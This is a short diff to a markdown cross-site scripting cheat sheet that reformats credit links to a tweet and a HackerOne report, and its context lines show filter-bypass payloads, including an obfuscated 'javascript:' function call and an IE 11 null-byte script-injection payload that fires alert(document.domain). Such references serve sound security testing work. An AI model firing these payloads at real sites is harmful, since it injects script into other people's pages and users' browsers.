@@ -33,12 +33,13 @@ javascript:new%20Function`al\ert\`1\``;
 You can also obfuscate it using HTML entities
 
 ## WAF/filter Bypass
-[Tweet](https://twitter.com/si9int/status/1239633166438223874) By [si9int](https://twitter.com/si9int)
+*[Tweet](https://twitter.com/si9int/status/1239633166438223874) By [si9int](https://twitter.com/si9int)*
 ![XSS](https://images-ext-1.discordapp.net/external/igR8oewSZci1zKzKoqk0xr9PunkJoDHTmGgLLi6FYfw/https/pbs.twimg.com/media/ETQPvU3WoAMiDBw.png%3Alarge)
 
 ## IE Bypass
 
-IE 11 Xss Bypass [h1 report](https://hackerone.com/reports/127259) by [sergeym](https://hackerone.com/sergeym)
+### IE 11 Xss Bypass 
+*[Report #127259](https://hackerone.com/reports/127259) by [sergeym](https://hackerone.com/sergeym)*
 
 ```html
 "</script><script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)
